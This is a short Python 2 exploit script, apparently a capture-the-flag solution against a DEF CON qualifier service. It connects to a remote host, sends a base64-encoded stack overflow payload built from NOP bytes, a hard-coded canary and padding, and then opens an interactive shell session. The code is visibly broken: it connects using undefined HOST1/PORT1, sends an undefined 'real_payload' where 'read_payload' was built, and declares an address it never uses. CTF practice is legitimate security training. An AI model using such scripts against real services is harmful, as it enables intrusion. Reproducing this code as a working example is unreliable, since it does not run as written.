from s0ngsari import *
from base64 import *
HOST = "easy-prasky_335e35448b30ce7697fbb036cce45e34.quals.shallweplayaga.me"
PORT = 10001

def recvuntil(t):
        data = ''
        while not data.endswith(t):
                tmp = s.recv(1)
                if not tmp: break
                data += tmp
        return data

s = socket(AF_INET,SOCK_STREAM)
s.connect((HOST1,PORT1))

canary = "lddw"
sys_fopen = 0x804873B


payload = "\x90"*20
payload += canary
payload += "A"*22 + "\n"

read_payload = b64encode(payload)
print recvuntil("on-bing")

time.sleep(0.5)
s.send(real_payload + "\n")

t = Telnet()
t.sock = s
t.interact()

